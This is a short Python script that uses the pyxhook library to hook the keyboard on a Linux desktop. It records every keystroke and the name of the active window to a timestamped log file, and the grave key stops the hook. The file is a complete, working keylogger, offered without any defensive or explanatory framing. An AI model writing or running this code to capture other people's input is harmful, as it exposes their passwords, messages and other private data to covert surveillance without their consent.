import pyxhook
import datetime
import os
#change this to your log file's path
now = datetime.datetime.now()
log_file=os.getcwd()
log_file=log_file+'/logs/'+str(now)

#this function is called everytime a key is pressed.
def OnKeyPress(event):
  fob=open(log_file,'a')
  s="WindowName:"+event.WindowName+"   Key:"+event.Key
  fob.write(s)
  fob.write('\n')

  if event.Ascii==96: #96 is the ascii value of the grave key (`)
    fob.close()
    new_hook.cancel()
#instantiate HookManager class  
new_hook=pyxhook.HookManager()
#listen to all keystrokes
new_hook.KeyDown=OnKeyPress

#Hook the keyboard 

new_hook.HookKeyboard()
#start the session
new_hook.start()
